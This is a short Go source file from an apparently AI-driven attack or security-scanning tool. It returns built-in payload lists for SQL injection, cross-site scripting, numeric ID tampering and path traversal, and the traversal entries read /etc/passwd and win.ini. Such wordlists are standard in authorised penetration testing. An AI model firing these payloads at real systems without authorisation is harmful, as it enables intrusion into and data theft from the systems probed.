package attack

// GetInternalWordlist returns high-probability payloads for specific attack types
// This allows the AI to schedule attacks without requiring external files.
func GetInternalWordlist(category string) []string {
	switch category {
	case "sqli":
		return []string{
			"'", "\"", "1' OR '1'='1", "1\" OR \"1\"=\"1",
			"' OR 1=1--", "\" OR 1=1--",
			"admin' --", "admin\" --",
			"' UNION SELECT NULL--", "' UNION SELECT NULL,NULL--",
			"1' ORDER BY 1--", "1' ORDER BY 10--",
		}
	case "xss":
		return []string{
			"<script>alert(1)</script>",
			"\"><script>alert(1)</script>",
			"<img src=x onerror=alert(1)>",
			"javascript:alert(1)",
			"<svg/onload=alert(1)>",
			"\"><img src=x onerror=alert(1)>",
		}
	case "numeric": // For IDOR/BOLA
		return []string{
			"0", "1", "10", "100", "1000",
			"-1", "999999", "0000",
			"1.0", "1e10",
		}
	case "traversal":
		return []string{
			"../etc/passwd",
			"../../../../etc/passwd",
			"..\\windows\\win.ini",
			"....//....//etc/passwd",
			"/etc/passwd",
		}
	default:
		return []string{"test", "admin", "debug", "root"}
	}
}
